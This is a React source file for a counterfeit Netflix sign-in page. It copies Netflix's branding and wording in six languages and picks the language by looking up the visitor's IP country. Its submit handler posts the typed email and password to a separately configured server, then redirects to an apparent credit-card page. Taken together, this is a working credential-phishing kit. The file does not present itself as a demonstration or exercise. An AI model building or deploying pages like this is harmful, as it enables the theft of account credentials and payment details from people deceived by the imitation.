import React, { useEffect, useState } from "react";
import { Link } from "react-router";

function Forme() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [errors, setErrors] = useState({});
  const [emailFocused, setEmailFocused] = useState(false);
  const [passwordFocused, setPasswordFocused] = useState(false);
  const [showInfo, setShowInfo] = useState(false);
  const [isHovered, setIsHovered] = useState(false);
  const [isHoveredCode, setIsHoveredCode] = useState(false);
  const [rememberMe, setRememberMe] = useState(true);
  const [language, setLanguage] = useState("da"); // default: Danish
  const apiUrl = import.meta.env.VITE_API_URL;

  // --- Translations ---
  const translations = {
    da: {
      loginTitle: "Log ind",
      emailLabel: "E-mail eller mobilnummer",
      emailError: "Indtast venligst en gyldig e-mail eller et telefonnummer.",
      passwordLabel: "Adgangskode",
      passwordError: "Din adgangskode skal indeholde mellem 4 og 60 tegn.",
      loginButton: "Log ind",
      orText: "ELLER",
      codeButton: "Brug en login-kode",
      forgotPassword: "Glemt adgangskode?",
      rememberMe: "Husk mig",
      newToNetflix: "Ny på Netflix?",
      signUpNow: "Tilmeld dig nu.",
      recaptchaText: "Denne side er beskyttet af Google reCAPTCHA for at sikre, at du ikke er en robot.",
      learnMore: "Få mere at vide.",
      recaptchaInfo: "De oplysninger, der indsamles af Google reCAPTCHA, er underlagt Googles privatlivspolitik og servicevilkår og bruges til at levere, vedligeholde og forbedre reCAPTCHA-tjenesten samt til generelle sikkerhedsformål (de bruges ikke til personlig annoncering af Google).",
      loginFailed: "❌ Der opstod en fejl: ",
      serverError: "❌ Kunne ikke forbinde til serveren",
    },
    en: {
      loginTitle: "Sign In",
      emailLabel: "Email or mobile number",
      emailError: "Please enter a valid email or phone number.",
      passwordLabel: "Password",
      passwordError: "Your password must contain between 4 and 60 characters.",
      loginButton: "Sign In",
      orText: "OR",
      codeButton: "Use a login code",
      forgotPassword: "Forgot password?",
      rememberMe: "Remember me",
      newToNetflix: "New to Netflix?",
      signUpNow: "Sign up now.",
      recaptchaText: "This page is protected by Google reCAPTCHA to ensure you're not a robot.",
      learnMore: "Learn more.",
      recaptchaInfo: "The information collected by Google reCAPTCHA is subject to Google's Privacy Policy and Terms of Service, and is used to provide, maintain, and improve the reCAPTCHA service and for general security purposes (it is not used for personalized advertising by Google).",
      loginFailed: "❌ An error occurred: ",
      serverError: "❌ Failed to connect to server",
    },
    fr: {
      loginTitle: "Connexion",
      emailLabel: "E-mail ou numéro de téléphone",
      emailError: "Veuillez saisir une adresse e-mail ou un numéro de téléphone valide.",
      passwordLabel: "Mot de passe",
      passwordError: "Votre mot de passe doit contenir entre 4 et 60 caractères.",
      loginButton: "Connexion",
      orText: "OU",
      codeButton: "Utiliser un code de connexion",
      forgotPassword: "Mot de passe oublié ?",
      rememberMe: "Se souvenir de moi",
      newToNetflix: "Nouveau sur Netflix ?",
      signUpNow: "Inscrivez-vous maintenant.",
      recaptchaText: "Cette page est protégée par Google reCAPTCHA pour vérifier que vous n'êtes pas un robot.",
      learnMore: "En savoir plus.",
      recaptchaInfo: "Les informations collectées par Google reCAPTCHA sont soumises à la politique de confidentialité et aux conditions d'utilisation de Google, et sont utilisées pour fournir, maintenir et améliorer le service reCAPTCHA ainsi qu'à des fins de sécurité générale (elles ne sont pas utilisées pour la publicité personnalisée par Google).",
      loginFailed: "❌ Une erreur s'est produite : ",
      serverError: "❌ Échec de la connexion au serveur",
    },
    ar: {
      loginTitle: "تسجيل الدخول",
      emailLabel: "البريد الإلكتروني أو رقم الهاتف",
      emailError: "يرجى إدخال بريد إلكتروني أو رقم هاتف صالح.",
      passwordLabel: "كلمة المرور",
      passwordError: "يجب أن تحتوي كلمة المرور على ما بين 4 و 60 حرفًا.",
      loginButton: "تسجيل الدخول",
      orText: "أو",
      codeButton: "استخدم رمز تسجيل الدخول",
      forgotPassword: "نسيت كلمة المرور؟",
      rememberMe: "تذكرني",
      newToNetflix: "جديد على Netflix؟",
      signUpNow: "اشترك الآن.",
      recaptchaText: "هذه الصفحة محمية بواسطة Google reCAPTCHA للتأكد من أنك لست روبوتًا.",
      learnMore: "اعرف المزيد.",
      recaptchaInfo: "المعلومات التي يتم جمعها بواسطة Google reCAPTCHA تخضع لسياسة الخصوصية وشروط الخدمة الخاصة بـ Google، وتستخدم لتقديم خدمة reCAPTCHA وصيانتها وتحسينها ولأغراض الأمان العامة (لا تستخدم للإعلانات المخصصة من Google).",
      loginFailed: "❌ حدث خطأ: ",
      serverError: "❌ فشل الاتصال بالخادم",
    },
    es: {
      loginTitle: "Iniciar sesión",
      emailLabel: "Correo electrónico o número de teléfono",
      emailError: "Por favor, introduce un correo electrónico o número de teléfono válido.",
      passwordLabel: "Contraseña",
      passwordError: "Tu contraseña debe tener entre 4 y 60 caracteres.",
      loginButton: "Iniciar sesión",
      orText: "O",
      codeButton: "Usar un código de inicio de sesión",
      forgotPassword: "¿Olvidaste tu contraseña?",
      rememberMe: "Recuérdame",
      newToNetflix: "¿Nuevo en Netflix?",
      signUpNow: "Regístrate ahora.",
      recaptchaText: "Esta página está protegida por Google reCAPTCHA para asegurar que no eres un robot.",
      learnMore: "Más información.",
      recaptchaInfo: "La información recopilada por Google reCAPTCHA está sujeta a la Política de privacidad y Términos de servicio de Google, y se utiliza para proporcionar, mantener y mejorar el servicio de reCAPTCHA, así como para fines de seguridad general (no se utiliza para publicidad personalizada por parte de Google).",
      loginFailed: "❌ Ocurrió un error: ",
      serverError: "❌ Error al conectar con el servidor",
    },
    de: {
      loginTitle: "Anmelden",
      emailLabel: "E-Mail oder Mobilfunknummer",
      emailError: "Bitte gib eine gültige E-Mail-Adresse oder Telefonnummer ein.",
      passwordLabel: "Passwort",
      passwordError: "Dein Passwort muss zwischen 4 und 60 Zeichen lang sein.",
      loginButton: "Anmelden",
      orText: "ODER",
      codeButton: "Anmeldecode verwenden",
      forgotPassword: "Passwort vergessen?",
      rememberMe: "Angemeldet bleiben",
      newToNetflix: "Neu bei Netflix?",
      signUpNow: "Jetzt anmelden.",
      recaptchaText: "Diese Seite ist durch Google reCAPTCHA geschützt, um sicherzustellen, dass du kein Roboter bist.",
      learnMore: "Mehr erfahren.",
      recaptchaInfo: "Die von Google reCAPTCHA gesammelten Informationen unterliegen der Google Datenschutzerklärung und den Nutzungsbedingungen und werden verwendet, um den reCAPTCHA-Dienst bereitzustellen, zu warten und zu verbessern sowie für allgemeine Sicherheitszwecke (sie werden nicht für personalisierte Werbung von Google verwendet).",
      loginFailed: "❌ Ein Fehler ist aufgetreten: ",
      serverError: "❌ Verbindung zum Server fehlgeschlagen",
    },
  };

  const t = translations[language] || translations.en;

  const CheckIcon = () => (
    <svg
      xmlns="http://www.w3.org/2000/svg"
      fill="none"
      role="img"
      viewBox="0 0 16 16"
      width="16"
      height="16"
    >
      <path
        fillRule="evenodd"
        clipRule="evenodd"
        d="M13.4696 3.46973L14.5303 4.53039L6.53026 12.5304C6.23737 12.8233 5.7625 12.8233 5.4696 12.5304L1.4696 8.53039L2.53026 7.46973L5.99993 10.9394L13.4696 3.46973Z"
        fill="currentColor"
      />
    </svg>
  );

  // Detect language based on IP (country code)
  useEffect(() => {
    const detectLanguageByIP = async () => {
      try {
        // Using free IP geolocation API (ip-api.com)
        const response = await fetch('http://ip-api.com/json/');
        const data = await response.json();
        if (data && data.countryCode) {
          const countryCode = data.countryCode;
          // Map country codes to supported languages
          const langMap = {
            DK: 'da',
            US: 'en',
            GB: 'en',
            FR: 'fr',
            DZ: 'ar',
            MA: 'ar',
            TN: 'ar',
            EG: 'ar',
            SA: 'ar',
            AE: 'ar',
            IQ: 'ar',
            JO: 'ar',
            LB: 'ar',
            LY: 'ar',
            MR: 'ar',
            PS: 'ar',
            SY: 'ar',
            YE: 'ar',
            ES: 'es',
            MX: 'es',
            AR: 'es',
            CO: 'es',
            DE: 'de',
            AT: 'de',
            CH: 'de',
          };
          const detectedLang = langMap[countryCode] || 'en';
          setLanguage(detectedLang);
        } else {
          setLanguage('en');
        }
      } catch (error) {
        console.error('IP detection failed:', error);
        setLanguage('en'); // fallback to English
      }
    };
    detectLanguageByIP();
  }, []);

  const validateField = (field) => {
    const newErrors = { ...errors };

    if (field === "email") {
      const emailRegex = /^\S+@\S+\.\S+$/;
      const phoneRegex = /^(?:\+45|0045)?\s?\d{8}$/;

      if (!emailRegex.test(email) && !phoneRegex.test(email)) {
        newErrors.email = t.emailError;
      } else {
        delete newErrors.email;
      }
    }

    if (field === "password") {
      if (password.length < 4 || password.length > 60) {
        newErrors.password = t.passwordError;
      } else {
        delete newErrors.password;
      }
    }

    setErrors(newErrors);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    validateField("email");
    validateField("password");

    if (!email || !password) return;
    if (Object.keys(errors).length !== 0) return;

    try {
      const response = await fetch(`${apiUrl}/api/login`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ email, password }),
      });

      const data = await response.json();

      if (response.ok) {
        window.location.href = "/signup/creditoption";
      } else {
        alert(t.loginFailed + data.error);
      }
    } catch (err) {
      console.error("Login error:", err);
      alert(t.serverError);
    }
  };

  const isEmailActive = emailFocused || email.length > 0;
  const isPasswordActive = passwordFocused || password.length > 0;

  useEffect(() => {
    setTimeout(() => {
      if (email.length > 0) {
        setEmailFocused(false);
      }
    }, 100);
  }, []);

  return (
    <div
      style={{
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        width: "100%",
        height: 757,
      }}
    >
      <div
        className="default-ltr-cache"
        style={{
          height: showInfo ? 778 : 709,
          marginBottom: 48,
          borderRadius: 5,
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          transition: "height 0.3s ease",
        }}
      >
        <div style={{ width: 322 }}>
          {/* Language Selector */}
          <div style={{ display: "flex", justifyContent: "flex-end", marginBottom: 16 }}>
            <select
              value={language}
              onChange={(e) => setLanguage(e.target.value)}
              style={{
                background: "rgba(22, 22, 22, 0.7)",
                color: "white",
                border: "1px solid #63666a",
                borderRadius: 4,
                padding: "4px 8px",
                fontSize: 14,
                cursor: "pointer",
              }}
            >
              <option value="da">Dansk</option>
              <option value="en">English</option>
              <option value="fr">Français</option>
              <option value="ar">العربية</option>
              <option value="es">Español</option>
              <option value="de">Deutsch</option>
            </select>
          </div>

          <div>
            <h1
              data-uia="login-title"
              className="default-ltr-cache-13bzzhe euy28770"
              style={{
                marginTop: "48px",
                padding: "0px",
                fontWeight: 700,
                color: "rgb(255, 255, 255)",
                textAlign: "start",
                fontFamily:
                  '"Netflix Sans","Helvetica Neue","Segoe UI",Roboto,Ubuntu,sans-serif',
                fontStyle: "normal",
                letterSpacing: "normal",
                orphans: 2,
                textIndent: "0px",
                textTransform: "none",
                widows: 2,
                wordSpacing: "0px",
                whiteSpace: "normal",
              }}
            >
              {t.loginTitle}
            </h1>
          </div>

          <form
            onSubmit={handleSubmit}
            style={{ display: "flex", flexDirection: "column", marginTop: 24 }}
          >
            {/* Email */}
            <div
              style={{
                position: "relative",
                marginBottom: errors.email ? 4 : 16,
              }}
            >
              <input
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                onFocus={() => setEmailFocused(true)}
                onBlur={() => {
                  setEmailFocused(false);
                  validateField("email");
                }}
                style={{
                  height: 24,
                  borderRadius: 4,
                  border: `1px solid ${errors.email ? "#eb3942" : "#63666a"}`,
                  color: "white",
                  fontSize: 16,
                  width: 290,
                  padding: "24px 16px 8px 16px",
                  background: "rgba(22, 22, 22, 0.7)",
                  WebkitTextFillColor: "white",
                  transition: "background-color 5000s ease-in-out 0s",
                }}
              />
              <label
                style={{
                  position: "absolute",
                  left: 16,
                  top: isEmailActive ? 6 : 16,
                  fontSize: isEmailActive ? 12 : 16,
                  transition: "all 0.2s ease",
                  pointerEvents: "none",
                  color: "rgba(255, 255, 255, 0.7)",
                }}
              >
                {t.emailLabel}
              </label>
            </div>
            {errors.email && (
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  color: "#eb3942",
                  fontSize: 14,
                  marginTop: 4,
                  marginBottom: 8,
                }}
              >
                <span style={{ marginRight: 4 }}>
                  <svg
                    style={{ paddingTop: "5px" }}
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    role="img"
                    viewBox="0 0 16 16"
                    width="16"
                    height="16"
                    data-icon="CircleXSmall"
                    aria-hidden="true"
                    className="default-ltr-cache-163bhew-StyledCircleXSmall-StyledValidationIcon e1vkmu653"
                  >
                    <path
                      fill="currentColor"
                      d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z"
                      clipRule="evenodd"
                      fillRule="evenodd"
                    ></path>
                  </svg>
                </span>
                {errors.email}
              </div>
            )}

            {/* Password */}
            <div
              style={{
                position: "relative",
                marginBottom: errors.password ? 4 : 16,
              }}
            >
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onFocus={() => setPasswordFocused(true)}
                onBlur={() => {
                  setPasswordFocused(false);
                  validateField("password");
                }}
                style={{
                  height: 24,
                  borderRadius: 4,
                  border: `1px solid ${
                    errors.password ? "#eb3942" : "#63666a"
                  }`,
                  color: "white",
                  fontSize: 16,
                  width: 290,
                  padding: "24px 16px 8px 16px",
                  background: "rgba(22, 22, 22, 0.7)",
                  WebkitTextFillColor: "white",
                  transition: "background-color 5000s ease-in-out 0s",
                }}
              />
              <label
                style={{
                  position: "absolute",
                  left: 16,
                  top: isPasswordActive ? 6 : 16,
                  fontSize: isPasswordActive ? 12 : 16,
                  color: "rgba(255, 255, 255, 0.7)",
                  transition: "all 0.2s ease",
                  pointerEvents: "none",
                }}
              >
                {t.passwordLabel}
              </label>
            </div>
            {errors.password && (
              <div style={{ color: "#eb3942", fontSize: 14, marginBottom: 16 }}>
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  role="img"
                  viewBox="0 0 16 16"
                  width="16"
                  height="16"
                  data-icon="CircleXSmall"
                  aria-hidden="true"
                  className="default-ltr-cache-163bhew-StyledCircleXSmall-StyledValidationIcon e1vkmu653"
                >
                  <path
                    fill="currentColor"
                    d="M14.5 8C14.5 11.5899 11.5899 14.5 8 14.5C4.41015 14.5 1.5 11.5899 1.5 8C1.5 4.41015 4.41015 1.5 8 1.5C11.5899 1.5 14.5 4.41015 14.5 8ZM16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8ZM4.46967 5.53033L6.93934 8L4.46967 10.4697L5.53033 11.5303L8 9.06066L10.4697 11.5303L11.5303 10.4697L9.06066 8L11.5303 5.53033L10.4697 4.46967L8 6.93934L5.53033 4.46967L4.46967 5.53033Z"
                    clipRule="evenodd"
                    fillRule="evenodd"
                  ></path>
                </svg>{" "}
                {errors.password}
              </div>
            )}
            <button
              type="submit"
              onMouseEnter={() => setIsHovered(true)}
              onMouseLeave={() => setIsHovered(false)}
              style={{
                background: "#e50914",
                color: "white",
                height: 40,
                width: 322,
                borderRadius: 4,
                border: "none",
                outline: "none",
                filter: isHovered ? "brightness(85%)" : "brightness(100%)",
                transition: "filter 0.2s",
              }}
            >
              {t.loginButton}
            </button>
          </form>
          <div
            style={{
              display: "flex",
              flexDirection: "column",
              alignItems: "center",
            }}
          >
            <span
              style={{ color: "rgb(165,165,165)", fontWeight: 500, margin: 15 }}
            >
              {t.orText}
            </span>
            <button
              onMouseEnter={() => setIsHoveredCode(true)}
              onMouseLeave={() => setIsHoveredCode(false)}
              style={{
                backgroundColor: "rgba(157, 157, 157, 0.4)",
                color: "white",
                height: 40,
                width: 322,
                borderRadius: 4,
                border: "none",
                outline: "none",
                filter: isHoveredCode ? "brightness(85%)" : "brightness(100%)",
                transition: "filter 0.2s",
              }}
            >
              {t.codeButton}
            </button>

            <br />
            <a
              href="https://www.netflix.com/tn-fr/loginHelp"
              style={{
                marginBottom: 15,
                display: "inline-block",
                color: "white",
                textDecoration: "underline",
                cursor: "pointer",
              }}
              onMouseOver={(e) => (e.target.style.color = "#b3b3b3")}
              onMouseOut={(e) => (e.target.style.color = "white")}
            >
              {t.forgotPassword}
            </a>
          </div>
          <div style={{ marginBottom: 16 }}>
            <div
              onClick={() => setRememberMe(!rememberMe)}
              style={{
                display: "flex",
                alignItems: "center",
                color: "#ffffff",
                fontSize: 16,
                cursor: "pointer",
              }}
            >
              <div
                style={{
                  width: 16,
                  height: 16,
                  backgroundColor: rememberMe ? "#fff" : "black",
                  border: "1px solid #737373",
                  borderRadius: 2,
                  marginRight: 12,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: "#000",
                }}
              >
                {rememberMe && <CheckIcon />}
              </div>
              {t.rememberMe}
            </div>
          </div>
          <div style={{ marginBottom: 20 }}>
            <span style={{ color: "#737373", fontSize: 16 }}>
              {t.newToNetflix}{" "}
              <a
                href="#"
                style={{
                  color: "white",
                  textDecoration: "none",
                  fontWeight: 500,
                }}
                onMouseOver={(e) =>
                  (e.target.style.textDecoration = "underline")
                }
                onMouseOut={(e) => (e.target.style.textDecoration = "none")}
              >
                {t.signUpNow}
              </a>
            </span>
          </div>
          <span
            style={{
              margin: 0,
              padding: 0,
              color: "rgba(255, 255, 255, 0.5)",
              fontSize: "0.8125rem",
              fontWeight: 400,
              textAlign: "start",
              userSelect: "text",
            }}
          >
            {t.recaptchaText}
          </span>
          <br />
          {!showInfo && (
            <p
              onClick={() => setShowInfo(true)}
              style={{
                display: "inline-block",
                color: "blue",
                fontSize: "0.8125rem",
                textDecoration: "underline",
                cursor: "pointer",
                marginBottom: 8,
              }}
            >
              {t.learnMore}
            </p>
          )}

          {showInfo && (
            <p
              style={{
                margin: 0,
                padding: 0,
                color: "rgba(255, 255, 255, 0.5)",
                fontSize: "0.8125rem",
                fontWeight: 400,
                textAlign: "start",
                userSelect: "text",
                lineHeight: 1.1,
              }}
            >
              {t.recaptchaInfo}
            </p>
          )}
        </div>
      </div>
    </div>
  );
}

export default Forme;